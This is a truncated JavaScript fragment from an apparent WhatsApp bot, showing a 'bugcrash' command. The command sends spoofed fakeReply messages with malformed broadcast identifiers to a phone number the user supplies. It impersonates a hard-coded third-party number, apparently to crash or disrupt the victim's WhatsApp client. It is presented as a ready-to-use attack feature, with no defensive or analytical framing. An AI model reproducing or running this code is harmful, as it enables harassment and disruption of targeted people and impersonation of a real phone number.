...
let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participants }) => {
	...
	switch (type) {
		...
		break
		case 'bugcrash': {
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '6281321776496@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '6281321776496@s.whatsapp.net', 'B', '0@broadcast')
